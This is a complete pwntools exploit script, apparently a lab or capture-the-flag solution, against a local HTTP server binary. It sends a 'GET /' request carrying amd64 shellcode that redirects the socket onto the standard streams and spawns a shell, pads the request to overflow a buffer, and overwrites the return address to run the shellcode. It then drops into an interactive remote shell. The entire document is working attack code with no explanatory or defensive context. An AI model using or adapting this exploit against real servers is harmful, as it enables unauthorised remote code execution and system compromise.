from pwn import *

r = remote("localhost", 10205)
e = ELF('../vm5/server/server.out')

# bss addresses
bss_addr = e.bss()
req_path_addr = bss_addr + 144 + 256
sockfd_addr = bss_addr + 144 + 256 + 128 + 8 + 8

# shellcode
s = """
mov rsi, 2
mov rdi, [%d]
dup2:
mov rax, 33
syscall
dec rsi
jns dup2
""" % sockfd_addr
s += shellcraft.amd64.sh()

# payload
p = "GET /" + asm(s, arch='amd64')
p += (1000 - len(p) + 8) * 'p'  # padding
shellcode_addr = req_path_addr + 2
p += p64(shellcode_addr)        # return address

r.sendline(p)
r.interactive()
